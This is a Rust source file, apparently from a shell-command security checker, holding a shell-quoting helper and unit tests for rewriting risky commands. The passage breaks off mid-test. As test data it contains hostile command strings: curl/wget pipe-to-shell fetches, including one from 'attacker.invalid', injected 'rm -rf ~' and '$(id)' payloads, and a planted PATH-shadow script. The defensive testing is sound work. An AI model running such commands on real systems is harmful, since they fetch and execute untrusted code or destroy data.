/// Reduce a command token to its base name: strip the directory and (PowerShell)
/// a trailing `.exe`. Mirrors how the detector identifies commands.
fn base_command(cmd: &str, shell: ShellType) -> String {
    let stripped = strip_quotes(cmd);
    let base = stripped
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(&stripped)
        .to_string();
    if shell == ShellType::PowerShell {
        base.strip_suffix(".exe")
            .or_else(|| base.strip_suffix(".EXE"))
            .unwrap_or(&base)
            .to_ascii_lowercase()
    } else {
        base
    }
}

fn starts_with_http(s: &str) -> bool {
    let b = s.as_bytes();
    (b.len() >= 8 && b[..8].eq_ignore_ascii_case(b"https://"))
        || (b.len() >= 7 && b[..7].eq_ignore_ascii_case(b"http://"))
}

/// Wrap an untrusted token in single quotes for safe interpolation into a
/// generated shell command, escaping each embedded `'` as `'\''`
/// (`foo'bar` → `'foo'\''bar'`). Single quotes make every other byte literal,
/// so `$( )`, backtick, `;`, `|`, `&`, spaces, and globs cannot break out.
///
/// Returns `None` when the token contains a byte that cannot be safely carried
/// in a single-token single-quoted string — a newline (`\n`) or NUL — so the
/// caller refuses the rewrite rather than emit a multi-line / truncated command.
///
/// `pub` so the copy-paste suggestion surfaces in both crates can neutralize an
/// attacker-controlled URL/domain before interpolating it into a suggested
/// `tirith trust add …` line (`output.rs::write_block_advisories`,
/// `trust.rs::format_add_line`): a blocked URL carrying `$( )`, backticks, `;`,
/// spaces, redirects, or globs would otherwise EXECUTE when the developer copies
/// the line. `sanitize_field` only strips terminal-control bytes; it is NOT a
/// shell escaper.
pub fn shell_single_quote(s: &str) -> Option<String> {
    if s.bytes().any(|b| b == b'\n' || b == b'\0') {
        return None;
    }
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for ch in s.chars() {
        if ch == '\'' {
            // Close the quote, emit an escaped literal `'`, reopen the quote.
            out.push_str("'\\''");
        } else {
            out.push(ch);
        }
    }
    out.push('\'');
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::verdict::{Evidence, Timings};

    // Transformation-shape unit tests intentionally exercise the private raw
    // candidate layer with an injected trusted runner. Public compatibility
    // APIs are guidance-only; the producer-owned CLI-inline seam separately
    // proves whole-command execution eligibility.
    fn suggest(cmd: &str, shell: ShellType, verdict: &Verdict) -> Vec<SafeSuggestion> {
        let ctx = default_exec_context(cmd, shell);
        suggest_candidates_with_runner(
            &ctx,
            verdict,
            None,
            Some(Path::new("/usr/local/bin/tirith")),
        )
    }

    fn finding(rule_id: RuleId) -> Finding {
        Finding {
            rule_id,
            severity: Severity::High,
            title: "t".into(),
            description: "d".into(),
            evidence: vec![Evidence::Text { detail: "e".into() }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        }
    }

    fn plain_http_finding(url: &str) -> Finding {
        let mut finding = finding(RuleId::PlainHttpToSink);
        finding.evidence = vec![Evidence::Url {
            raw: url.to_string(),
        }];
        finding
    }

    fn verdict_with(findings: Vec<Finding>) -> Verdict {
        Verdict::from_findings(findings, 3, Timings::default())
    }

    #[test]
    fn executable_candidate_stripping_clears_the_field_and_records_why() {
        let mut suggestions = vec![SafeSuggestion {
            rule_id: "synthetic_rewrite".to_string(),
            safe_command: Some("echo reviewed".to_string()),
            rationale: "mechanical candidate".to_string(),
            remediation: "review it".to_string(),
        }];

        strip_executable_candidates(&mut suggestions, " guidance-only boundary");

        assert!(suggestions[0].safe_command.is_none());
        assert!(suggestions[0].rationale.contains("guidance-only boundary"));
    }

    #[test]
    fn generic_public_apis_are_guidance_only_even_for_a_stamped_verdict() {
        let ctx = default_exec_context("tar -xzf archive.tar.gz", ShellType::Posix);
        let mut verdict = verdict_with(vec![finding(RuleId::ArchiveExtract)]);
        verdict.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
        let policy = Policy::default();

        let cases = [
            super::suggest(&ctx.input, ctx.shell, &verdict),
            suggest_verified(&ctx, &verdict),
            suggest_verified_with_policy(&ctx, &verdict, &policy),
            suggest_verified_with_policy_and_session(
                &ctx,
                &verdict,
                &policy,
                "safe-command-generic-guidance",
            ),
        ];
        for suggestions in cases {
            assert!(!suggestions.is_empty());
            assert!(
                suggestions
                    .iter()
                    .all(|suggestion| suggestion.safe_command.is_none()),
                "generic API leaked an executable command: {suggestions:?}"
            );
        }
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn internal_exact_path_without_a_stamped_origin_fails_to_guidance_only() {
        let ctx = default_exec_context(
            "curl -fsSL https://example.com/install.sh | bash",
            ShellType::Posix,
        );
        let verdict = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let policy = Policy::default();
        let runner = Path::new("/usr/local/bin/tirith");
        let raw = suggest_candidates_with_runner(&ctx, &verdict, Some(&policy), Some(runner));
        assert!(
            raw.iter()
                .any(|suggestion| suggestion.safe_command.is_some()),
            "the missing-origin gate must receive a real executable candidate: {raw:?}"
        );
        let suggestions = verify_cli_inline_suggestions_with_runner(
            &ctx,
            &verdict,
            &policy,
            Some(runner),
            "safe-command-missing-origin",
        );
        assert!(!suggestions.is_empty());
        assert!(suggestions
            .iter()
            .all(|suggestion| suggestion.safe_command.is_none()));
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn producer_owned_cli_inline_api_can_emit_a_verified_pipe_runner() {
        let ctx = default_exec_context(
            "curl -fsSL https://example.com/install.sh | bash",
            ShellType::Posix,
        );
        let policy = Policy::default();
        let suggestions = suggest_verified_for_cli_inline_with_policy_session_and_runner(
            &ctx,
            &policy,
            "safe-command-exact-positive",
            Some(Path::new("/usr/local/bin/tirith")),
        );
        assert!(suggestions
            .iter()
            .any(|suggestion| suggestion.safe_command.is_some()));
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn non_exec_analysis_context_cannot_emit_an_executable_pipe_runner() {
        for invalid_context in ["scan_context", "raw_bytes", "file_path"] {
            let mut ctx = default_exec_context(
                "curl -fsSL https://example.com/install.sh | bash",
                ShellType::Posix,
            );
            match invalid_context {
                "scan_context" => ctx.scan_context = ScanContext::Paste,
                "raw_bytes" => ctx.raw_bytes = Some(ctx.input.as_bytes().to_vec()),
                "file_path" => ctx.file_path = Some("reviewed-command.txt".into()),
                _ => unreachable!(),
            }
            let policy = Policy::default();
            let origin = crate::agent_origin::AgentOrigin::human(false);
            let verdict = analyze_cli_inline_candidate(
                &ctx,
                &origin,
                &policy,
                "safe-command-context-boundary",
            );
            let runner = Path::new("/usr/local/bin/tirith");
            let raw = suggest_candidates_with_runner(&ctx, &verdict, Some(&policy), Some(runner));
            assert!(
                raw.iter()
                    .any(|suggestion| suggestion.safe_command.is_some()),
                "the {invalid_context} gate must receive a real executable candidate: {raw:?}"
            );
            let suggestions = verify_cli_inline_suggestions_with_runner(
                &ctx,
                &verdict,
                &policy,
                Some(runner),
                "safe-command-context-boundary",
            );
            assert!(
                suggestions
                    .iter()
                    .all(|suggestion| suggestion.safe_command.is_none()),
                "{invalid_context} leaked an executable suggestion: {suggestions:?}"
            );
        }
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn delayed_reinvocation_requires_the_tirith_program_name() {
        assert!(is_tirith_runner_path(Path::new("/usr/local/bin/tirith")));
        assert!(!is_tirith_runner_path(Path::new("/usr/local/bin/foo")));
        assert!(!is_tirith_runner_path(Path::new(
            "/usr/local/bin/tirith.exe"
        )));
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    fn assert_injected_tirith_prefix(command: &str, shell: ShellType) {
        let marker = " run --capsule --script-stdin --interpreter ";
        let (encoded_program, _) = command
            .split_once(marker)
            .unwrap_or_else(|| panic!("missing hardened runner marker: {command}"));
        let decoded = decode_shell_literal(encoded_program, shell)
            .unwrap_or_else(|| panic!("runner path is not one literal shell word: {command}"));
        assert_eq!(
            decoded, "/usr/local/bin/tirith",
            "rewrite must bind the injected absolute executable"
        );
        assert!(Path::new(&decoded).is_absolute());
        assert_ne!(encoded_program, "tirith", "bare PATH lookup is forbidden");
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn verified_suggestions_reuse_original_policy_snapshot_after_file_change() {
        let repo = tempfile::tempdir().expect("temp repo");
        std::fs::create_dir_all(repo.path().join(".git")).expect("git marker");
        let policy_dir = repo.path().join(".tirith");
        std::fs::create_dir_all(&policy_dir).expect("policy dir");
        let policy_path = policy_dir.join("policy.yaml");
        std::fs::write(
            &policy_path,
            "custom_rules:\n  - id: forbid-example-fetch\n    when:\n      url.host: example.com\n    severity: medium\n    title: forbidden\n    context: [exec]\n",
        )
        .expect("write policy");

        let mut ctx = default_exec_context(
            "curl -fsSL https://example.com/install.sh | bash",
            ShellType::Posix,
        );
        ctx.cwd = Some(repo.path().display().to_string());
        let policy = Policy::load_from_yaml(
            &std::fs::read_to_string(&policy_path).expect("read frozen test policy"),
            Some(policy_path.to_string_lossy().as_ref()),
        );
        let mut verdict = engine::analyze_with_policy_without_bypass(&ctx, &policy);
        verdict.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
        assert!(
            verdict
                .findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::CustomRuleMatch),
            "original snapshot must contain the repo-local custom rule: {verdict:?}"
        );

        // Simulate a policy TOCTOU between original analysis and candidate
        // verification. The captured policy must remain authoritative.
        std::fs::remove_file(&policy_path).expect("remove live policy");
        let runner = Path::new("/usr/local/bin/tirith");
        let raw = suggest_candidates_with_runner(&ctx, &verdict, Some(&policy), Some(runner));
        assert!(
            raw.iter()
                .any(|suggestion| suggestion.safe_command.is_some()),
            "the snapshot gate must receive a real executable candidate: {raw:?}"
        );
        let suggestions = verify_cli_inline_suggestions_with_runner(
            &ctx,
            &verdict,
            &policy,
            Some(runner),
            "safe-command-snapshot",
        );
        assert!(
            suggestions
                .iter()
                .all(|suggestion| suggestion.safe_command.is_none()),
            "removing the live file must not make a snapshot-forbidden candidate executable: {suggestions:?}"
        );

        let candidate = raw
            .iter()
            .find_map(|suggestion| suggestion.safe_command.clone())
            .expect("raw typed runner candidate");
        let candidate_ctx = context_with_input(&ctx, candidate);
        let candidate_verdict = engine::analyze_with_policy_without_bypass(&candidate_ctx, &policy);
        assert!(
            candidate_verdict
                .findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::CustomRuleMatch),
            "snapshot re-analysis must retain the removed custom rule: {candidate_verdict:?}"
        );
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn effective_allow_with_pending_approval_never_becomes_executable() {
        let ctx = default_exec_context(
            "curl -fsSL https://example.com/install.sh | bash",
            ShellType::Posix,
        );
        let mut policy = Policy::default();
        policy
            .severity_overrides
            .insert("curl_pipe_shell".to_string(), Severity::Info);
        policy.approval_rules.push(crate::policy::ApprovalRule {
            rule_ids: vec!["curl_pipe_shell".to_string()],
            timeout_secs: 30,
            fallback: "block".to_string(),
        });
        let mut raw = engine::analyze_with_policy_without_bypass(&ctx, &policy);
        raw.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
        let effective = crate::escalation::post_process_verdict_for_verification(
            &raw,
            &policy,
            &ctx.input,
            "safe-command-pending-approval",
            crate::escalation::CallerContext::Cli,
        );
        assert_eq!(effective.action, Action::Allow);
        assert_eq!(effective.requires_approval, Some(true));

        let runner = Path::new("/usr/local/bin/tirith");
        let raw_candidates =
            suggest_candidates_with_runner(&ctx, &effective, Some(&policy), Some(runner));
        assert!(
            raw_candidates
                .iter()
                .any(|suggestion| suggestion.safe_command.is_some()),
            "the approval gate must receive a real executable candidate: {raw_candidates:?}"
        );
        let suggestions = verify_cli_inline_suggestions_with_runner(
            &ctx,
            &effective,
            &policy,
            Some(runner),
            "safe-command-pending-approval",
        );
        assert!(suggestions
            .iter()
            .all(|suggestion| suggestion.safe_command.is_none()));
    }

    #[test]
    fn retained_info_findings_never_make_archive_or_dotfile_guidance_executable() {
        for (command, rule_id, rule_name) in [
            (
                "tar -xzf archive.tar.gz",
                RuleId::ArchiveExtract,
                "archive_extract",
            ),
            (
                "echo reviewed > ~/.bashrc",
                RuleId::DotfileOverwrite,
                "dotfile_overwrite",
            ),
        ] {
            let ctx = default_exec_context(command, ShellType::Posix);
            // The engine normally filters effective Info findings from its final
            // verdict. Construct one directly to pin this API boundary even if a
            // future producer retains informational findings for display.
            let mut info_finding = finding(rule_id);
            info_finding.severity = Severity::Info;
            let mut verdict = verdict_with(vec![info_finding]);
            verdict.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
            assert_eq!(verdict.action, Action::Allow, "{verdict:?}");
            assert_eq!(verdict.findings.len(), 1, "{verdict:?}");

            let policy = Policy::default();
            let suggestions = verify_cli_inline_suggestions_with_runner(
                &ctx,
                &verdict,
                &policy,
                Some(Path::new("/usr/local/bin/tirith")),
                "safe-command-info-override",
            );
            let suggestion = suggestions
                .iter()
                .find(|suggestion| suggestion.rule_id == rule_name)
                .unwrap_or_else(|| panic!("missing guidance for {rule_name}: {suggestions:?}"));
            assert!(
                suggestion.safe_command.is_none(),
                "an Info finding must not turn {rule_name} into executable output: {suggestion:?}"
            );
        }
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn agent_rule_denial_blocks_raw_allow_candidate() {
        let ctx = default_exec_context(
            "curl -fsSL https://example.com/install.sh | bash",
            ShellType::Posix,
        );
        let mut policy = Policy::default();
        policy.agent_rules.deny.push(crate::policy::AgentMatcher {
            kind: crate::policy::AgentOriginKind::Human,
            ..Default::default()
        });
        let mut verdict = engine::analyze_with_policy_without_bypass(&ctx, &policy);
        verdict.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
        let runner = Path::new("/usr/local/bin/tirith");
        let raw = suggest_candidates_with_runner(&ctx, &verdict, Some(&policy), Some(runner));
        let candidate = raw
            .iter()
            .find_map(|suggestion| suggestion.safe_command.clone())
            .unwrap_or_else(|| {
                panic!("the agent-deny gate must receive a real executable candidate: {raw:?}")
            });
        let candidate_ctx = context_with_input(&ctx, candidate);
        let raw_candidate = engine::analyze_with_policy_without_bypass(&candidate_ctx, &policy);
        assert_eq!(
            raw_candidate.action,
            Action::Allow,
            "the candidate must be safe before origin policy is applied: {raw_candidate:?}"
        );
        let human = crate::agent_origin::AgentOrigin::human(false);
        let denied_candidate = analyze_cli_inline_candidate(
            &candidate_ctx,
            &human,
            &policy,
            "safe-command-agent-deny",
        );
        assert_eq!(
            denied_candidate.action,
            Action::Block,
            "{denied_candidate:?}"
        );
        assert!(
            denied_candidate
                .findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::AgentDeniedByPolicy),
            "the effective denial must come from the human-origin agent rule: {denied_candidate:?}"
        );
        let suggestions = verify_cli_inline_suggestions_with_runner(
            &ctx,
            &verdict,
            &policy,
            Some(runner),
            "safe-command-agent-deny",
        );
        assert!(suggestions
            .iter()
            .all(|suggestion| suggestion.safe_command.is_none()));
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn curl_pipe_bash_rewrites_to_hardened_capsule_runner() {
        let cmd = "curl -fsSL https://example.com/install.sh | bash";
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert_eq!(s.len(), 1);
        let sc = s[0].safe_command.as_deref().unwrap();
        assert_injected_tirith_prefix(sc, ShellType::Posix);
        assert!(sc.ends_with(
            " run --capsule --script-stdin --interpreter bash 'https://example.com/install.sh'"
        ));
        assert!(!sc.contains("/tmp/"), "{sc}");
        assert!(!sc.contains(" && "), "{sc}");
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn common_curl_body_flags_keep_the_typed_rewrite() {
        let cmd = "curl -fsSL https://example.com/install.sh | bash";
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        let command = s[0].safe_command.as_deref().expect("runner rewrite");
        assert_injected_tirith_prefix(command, ShellType::Posix);
        assert!(command.ends_with(
            " run --capsule --script-stdin --interpreter bash 'https://example.com/install.sh'"
        ));
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn curl_rewrite_requires_matching_status_and_redirect_semantics() {
        for command in [
            "curl https://example.com/install.sh | bash",
            "curl -f https://example.com/install.sh | bash",
            "curl -L https://example.com/install.sh | bash",
        ] {
            let verdict = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
            let suggestions = suggest(command, ShellType::Posix, &verdict);
            assert!(
                suggestions[0].safe_command.is_none(),
                "mismatched curl redirect/status semantics must stay guidance-only: {command}"
            );
        }

        for command in [
            "curl -fsSL https://example.com/install.sh | bash",
            "curl --fail --silent --show-error --location https://example.com/install.sh | bash",
        ] {
            let verdict = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
            let suggestions = suggest(command, ShellType::Posix, &verdict);
            assert!(
                suggestions[0].safe_command.is_some(),
                "equivalent curl status/redirect semantics should remain rewritable: {command}"
            );
        }
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn pipe_rewrite_is_guidance_only_without_immutable_self_reinvocation() {
        let ctx = default_exec_context(
            "curl -fsSL https://example.com/install.sh | bash",
            ShellType::Posix,
        );
        let verdict = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let suggestions = suggest_candidates_with_runner(&ctx, &verdict, None, None);
        assert!(suggestions[0].safe_command.is_none());
        assert!(suggestions[0]
            .rationale
            .contains("No safe executable rewrite"));
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn emitted_absolute_runner_ignores_a_planted_first_path_tirith() {
        use std::os::unix::fs::PermissionsExt as _;

        let fixture = tempfile::tempdir().expect("PATH-shadow fixture");
        let marker = fixture.path().join("shadow-ran");
        let shadow = fixture.path().join("tirith");
        std::fs::write(
            &shadow,
            format!("#!/bin/sh\nprintf shadow > '{}'\n", marker.display()),
        )
        .expect("write planted tirith");
        std::fs::set_permissions(&shadow, std::fs::Permissions::from_mode(0o700))
            .expect("chmod planted tirith");

        let ctx = default_exec_context(
            "curl -fsSL https://example.com/install.sh | bash",
            ShellType::Posix,
        );
        let verdict = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let suggestions =
            suggest_candidates_with_runner(&ctx, &verdict, None, Some(Path::new("/bin/true")));
        let command = suggestions[0]
            .safe_command
            .as_deref()
            .expect("absolute runner rewrite");
        assert!(command.starts_with("'/bin/true' run "), "{command}");

        let status = std::process::Command::new("/bin/sh")
            .args(["-c", command])
            .env("PATH", fixture.path())
            .status()
            .expect("evaluate generated command under hostile PATH");
        assert!(status.success());
        assert!(
            !marker.exists(),
            "generated command resolved the planted PATH shadow"
        );
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn emitted_capsule_runner_reanalyzes_allow_with_original_policy_snapshot() {
        let ctx = default_exec_context(
            "curl -fsSL https://example.com/install.sh | bash",
            ShellType::Posix,
        );
        let (mut verdict, policy) = engine::analyze_without_bypass_returning_policy(&ctx);
        verdict.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
        assert_ne!(verdict.action, Action::Allow, "original pipeline must flag");

        let suggestions = verify_cli_inline_suggestions_with_runner(
            &ctx,
            &verdict,
            &policy,
            Some(Path::new("/usr/local/bin/tirith")),
            "safe-command-runner-policy-test",
        );
        let command = suggestions
            .iter()
            .find_map(|suggestion| suggestion.safe_command.as_deref())
            .expect("verified runner command");
        assert_injected_tirith_prefix(command, ShellType::Posix);
        assert!(command.ends_with(
            " run --capsule --script-stdin --interpreter bash 'https://example.com/install.sh'"
        ));

        let candidate_ctx = context_with_input(&ctx, command.to_string());
        let candidate = engine::analyze_with_policy_without_bypass(&candidate_ctx, &policy);
        assert_eq!(
            candidate.action,
            Action::Allow,
            "the exact emitted runner invocation must be Allow under the original policy snapshot: {candidate:?}"
        );
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn tls_http_pipe_chain_is_guidance_only_without_tool_option_proof() {
        let ctx = default_exec_context(
            "curl -k -fsSL http://attacker.invalid/script | bash",
            ShellType::Posix,
        );
        let (mut verdict, policy) = engine::analyze_without_bypass_returning_policy(&ctx);
        verdict.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
        assert_ne!(verdict.action, Action::Allow);

        let suggestions = verify_cli_inline_suggestions_with_runner(
            &ctx,
            &verdict,
            &policy,
            Some(Path::new("/usr/local/bin/tirith")),
            "safe-command-runner-compose-test",
        );
        assert!(suggestions
            .iter()
            .all(|suggestion| suggestion.safe_command.is_none()));
    }

    #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
    #[test]
    fn pipe_to_shell_is_guidance_only_without_runner_support() {
        let cmd = "curl -fsSL https://example.com/install.sh | bash";
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert!(s[0].safe_command.is_none());
        assert!(s[0].rationale.contains("No safe executable rewrite"));
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn wget_stdout_pipe_sh_uses_same_hardened_runner() {
        let cmd = "wget -qO- https://example.com/x.sh | sh";
        let v = verdict_with(vec![finding(RuleId::WgetPipeShell)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        let sc = s[0].safe_command.as_deref().unwrap();
        assert_injected_tirith_prefix(sc, ShellType::Posix);
        assert!(sc.ends_with(
            " run --capsule --script-stdin --interpreter sh 'https://example.com/x.sh'"
        ));
        assert!(!sc.contains("wget "), "{sc}");
    }

    #[test]
    fn wget_without_stdout_mode_is_guidance_only() {
        let cmd = "wget https://example.com/x.sh | sh";
        let v = verdict_with(vec![finding(RuleId::WgetPipeShell)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert!(s[0].safe_command.is_none());
    }

    #[test]
    fn pipe_with_extra_stage_yields_no_rewrite() {
        // Three segments — too complex for a correct one-line rewrite.
        let cmd = "curl -fsSL https://example.com/x.sh | tac | bash";
        let v = verdict_with(vec![finding(RuleId::PipeToInterpreter)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert_eq!(s.len(), 1);
        assert!(s[0].safe_command.is_none(), "{:?}", s[0].safe_command);
        assert!(!s[0].remediation.is_empty());
    }

    #[test]
    fn pipe_with_two_urls_yields_no_rewrite() {
        let cmd = "curl -fsSL https://a.example/x https://b.example/y | bash";
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert!(s[0].safe_command.is_none());
    }

    #[test]
    fn tls_and_http_option_grammar_ambiguities_are_guidance_only() {
        for (cmd, finding) in [
            (
                "curl --data -k https://example.com/x",
                finding(RuleId::InsecureTlsFlags),
            ),
            (
                "curl -k https://safe.example/x\n-k && evil",
                finding(RuleId::InsecureTlsFlags),
            ),
            (
                "curl --header http://marker.example https://example.com/x",
                plain_http_finding("http://marker.example/"),
            ),
            (
                "curl --data http://marker.example https://example.com/x",
                plain_http_finding("http://marker.example/"),
            ),
        ] {
            for shell in [
                ShellType::Posix,
                ShellType::Fish,
                ShellType::PowerShell,
                ShellType::Cmd,
            ] {
                let suggestions = suggest(cmd, shell, &verdict_with(vec![finding.clone()]));
                assert!(
                    suggestions.iter().all(|entry| entry.safe_command.is_none()),
                    "ambiguous {shell:?} rewrite became executable: {cmd}: {suggestions:?}"
                );
            }
        }
    }

    #[test]
    fn homograph_finding_gets_no_rewrite_but_keeps_remediation() {
        let cmd = "curl https://xn--gthub-2o5f.com/x";
        let v = verdict_with(vec![finding(RuleId::ConfusableDomain)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert_eq!(s.len(), 1);
        assert!(s[0].safe_command.is_none());
        assert!(!s[0].remediation.is_empty());
        assert!(s[0].rationale.contains("remediation"));
    }

    #[test]
    fn duplicate_rule_ids_deduplicated() {
        let cmd = "curl -fsSL https://example.com/x.sh | bash";
        let v = verdict_with(vec![
            finding(RuleId::CurlPipeShell),
            finding(RuleId::CurlPipeShell),
        ]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert_eq!(s.len(), 1, "same rule id must collapse to one suggestion");
    }

    #[test]
    fn no_findings_yields_no_suggestions() {
        let v = Verdict::allow_fast(1, Timings::default());
        assert!(suggest("ls", ShellType::Posix, &v).is_empty());
        assert_eq!(v.action, Action::Allow);
    }

    #[test]
    fn powershell_exe_interpreter_is_guidance_only() {
        let cmd = "curl -fsSL https://example.com/x.sh | bash.exe";
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::PowerShell, &v);
        assert!(s[0].safe_command.is_none());
    }

    #[test]
    fn powershell_pipe_rewrite_is_guidance_only_without_call_operator_model() {
        let cmd = "curl -fsSL 'https://example.com/a''b' | bash";
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::PowerShell, &v);
        assert!(s[0].safe_command.is_none());
        assert_eq!(
            decode_powershell_literal("'https://example.com/a''b'").as_deref(),
            Some("https://example.com/a'b")
        );
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn powershell_doubled_double_quote_is_decoded_not_dropped() {
        assert_eq!(
            decode_powershell_literal(r#""https://example.com/a""b""#).as_deref(),
            Some("https://example.com/a\"b")
        );
        // A literal quote is not an exact canonical URL byte sequence, so the
        // executable suggestion must be withheld rather than silently changing
        // `a"b` into `ab`.
        assert!(pipe_suggestion(
            r#"curl -fsSL "https://example.com/a""b" | bash"#,
            ShellType::PowerShell
        )
        .is_none());
    }

    #[test]
    fn powershell_backtick_literal_decodes_but_rewrite_remains_guidance_only() {
        let cmd = r#"curl -fsSL "https://example.com/a`'b" | bash"#;
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::PowerShell, &v);
        assert!(s[0].safe_command.is_none());
        assert_eq!(
            decode_powershell_literal(r#""https://example.com/a`'b""#).as_deref(),
            Some("https://example.com/a'b")
        );
    }

    #[test]
    fn cmd_pipe_to_shell_remains_guidance_only() {
        let cmd = "curl -fsSL https://example.com/x.sh | bash.exe";
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::Cmd, &v);
        assert!(s[0].safe_command.is_none());
    }

    #[test]
    fn every_suggestion_has_nonempty_remediation_and_rationale() {
        let cmd = "curl -fsSL http://example.com/x.sh | bash";
        let v = verdict_with(vec![
            finding(RuleId::CurlPipeShell),
            finding(RuleId::PlainHttpToSink),
        ]);
        for s in suggest(cmd, ShellType::Posix, &v) {
            assert!(!s.remediation.is_empty(), "rule {}", s.rule_id);
            assert!(!s.rationale.is_empty(), "rule {}", s.rule_id);
        }
    }

    #[test]
    fn dedicated_rule_present_is_an_env_scrub_trigger() {
        // M9 ch4 — the dedicated `EnvSensitiveExposedToUnknownScript` finding
        // (Medium, so the `any_high` heuristic is false) is recognized as an
        // env-scrub trigger without mutating process environment.
        let mut f = finding(RuleId::EnvSensitiveExposedToUnknownScript);
        f.severity = Severity::Medium;
        let v = verdict_with(vec![f]);
        let dedicated_present = v
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::EnvSensitiveExposedToUnknownScript);
        assert!(
            dedicated_present,
            "dedicated rule must be detectable as an env-scrub trigger"
        );
        let ctx = default_exec_context("curl https://example.com/install.sh", ShellType::Posix);
        let suggestions = suggest_candidates_with_runner(&ctx, &v, None, None);
        let guidance = suggestions
            .iter()
            .find(|suggestion| suggestion.rule_id == "env_scrub")
            .expect("dedicated rule must produce env guidance");
        assert!(guidance.safe_command.is_none());
        assert!(guidance.remediation.contains("clean environment"));
    }

    // ── shell_single_quote — untrusted-token neutralization (PR124) ────────

    #[test]
    fn shell_single_quote_wraps_plain_token() {
        assert_eq!(
            shell_single_quote("requests").as_deref(),
            Some("'requests'")
        );
        assert_eq!(
            shell_single_quote("https://example.com/install.sh").as_deref(),
            Some("'https://example.com/install.sh'")
        );
    }

    #[test]
    fn shell_single_quote_neutralizes_command_substitution() {
        // `$( )` and backticks become inert literals inside single quotes.
        assert_eq!(
            shell_single_quote("http://x/$(id)").as_deref(),
            Some("'http://x/$(id)'")
        );
        assert_eq!(
            shell_single_quote("http://x/`id`").as_deref(),
            Some("'http://x/`id`'")
        );
    }

    #[test]
    fn shell_single_quote_neutralizes_separators_and_spaces() {
        assert_eq!(
            shell_single_quote("http://x/a;rm -rf ~").as_deref(),
            Some("'http://x/a;rm -rf ~'")
        );
        assert_eq!(
            shell_single_quote("a|b&c>d<e").as_deref(),
            Some("'a|b&c>d<e'")
        );
    }

    #[test]
    fn shell_single_quote_escapes_embedded_single_quote() {
        // foo'bar → 'foo'\''bar' (close, escaped literal quote, reopen).
        assert_eq!(
            shell_single_quote("foo'bar").as_deref(),
            Some(r"'foo'\''bar'")
        );
        // A lone quote becomes ''\'' — still a single shell token.
        assert_eq!(shell_single_quote("'").as_deref(), Some(r"''\'''"));
    }

    #[test]
    fn shell_single_quote_refuses_newline_and_nul() {
        // Newline / NUL can't live in a single-token single-quoted string.
        assert_eq!(shell_single_quote("a\nb"), None);
        assert_eq!(shell_single_quote("a\0b"), None);
    }

    // ── rewrite_pipe_to_shell — one runner invocation, quoted URL ──────────

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    fn pipe_suggestion(cmd: &str, shell: ShellType) -> Option<String> {
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        suggest(cmd, shell, &v)[0].safe_command.clone()
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn single_quoted_dollar_syntax_is_literal_and_round_trips() {
        let sc = pipe_suggestion(
